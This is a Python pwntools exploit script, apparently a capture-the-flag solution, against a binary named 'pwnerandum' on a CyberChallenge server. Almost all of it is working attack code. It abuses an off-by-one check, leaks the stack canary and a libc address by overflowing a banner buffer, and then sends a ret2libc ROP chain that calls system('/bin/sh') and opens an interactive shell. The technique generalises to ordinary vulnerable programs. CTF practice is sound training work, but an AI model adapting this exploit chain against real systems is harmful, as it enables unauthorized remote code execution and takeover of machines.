#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("./pwnerandum")
libc = ELF("./libc.so")                             # REMOTE
# libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so")      # LOCALE
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("pwnerandum.challs.cyberchallenge.it", 9246)

    return r



def enable_premium():
    payload = b'A' * 26 + b'\x01'       # off-by-one read so we can become premium users
    r.sendlineafter(b'>> ', b'4')
    r.sendlineafter(b'Insert the secret to become premium \n', payload)



def leak_canary() -> bytes:
    r.sendlineafter(b'>> ', b'5')
    r.sendlineafter(b'Size of the new banner: \n', b'521')      # banner[520] + 1 (to overwrite the canary NULL byte so we can read it)
    r.sendlineafter(b'New banner:', b'A' * 521)

    r.recvuntil(b'A' * 521)
    canary = r.recv(7)
    log.info(f'Canary value leaked: {canary}')

    return int.from_bytes(b'\x00' + canary, 'little')



# NOTE: On remote, the size is "536" (instead of "696") and the OFFSET is "231" (instead of "128")
#       The address on remote was leaked with some intuition (old libc, no "__libc_start_call_main") and a few tries
def leak_libc_base_address():
    size, offset = 536, 231

    r.sendlineafter(b'>> ', b'5')
    r.sendlineafter(b'Size of the new banner: \n', str(size).encode('ascii'))
    r.sendlineafter(b'New banner:', b'A' * size)

    r.recvuntil(b'A' * size)
    leaked_addr = int.from_bytes(r.recv(6), 'little')     # __libc_start_main + <OFFSET>
    libc.address = leaked_addr - libc.symbols['__libc_start_main'] - offset

    log.info(f'LIBC base address: {hex(libc.address)}')



def spawn_shell(canary: int):
    rop = ROP(libc)

    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    _align  = rop.find_gadget(['ret'])[0]               # Align stack to 16 bits so we can call system correctly
    bin_sh  = next(libc.search(b'/bin/sh\x00'))
    system  = libc.symbols['system']

    payload = b'A' * 520 + p64(canary) + b'B' * 8 + p64(pop_rdi) + p64(bin_sh) + p64(_align) + p64(system)

    r.sendlineafter(b'>> ', b'5')
    r.sendlineafter(b'Size of the new banner: \n', str(len(payload)).encode('ascii'))
    r.sendlineafter(b'New banner:', payload)

    r.sendlineafter(b'>> ', b'9')       # Exit and trigger the ONE_GADGET
    r.interactive('> ')



def main():
    r = conn()

    enable_premium()
    canary = leak_canary()
    leak_libc_base_address()
    spawn_shell(canary=canary)


if __name__ == "__main__":
    main()
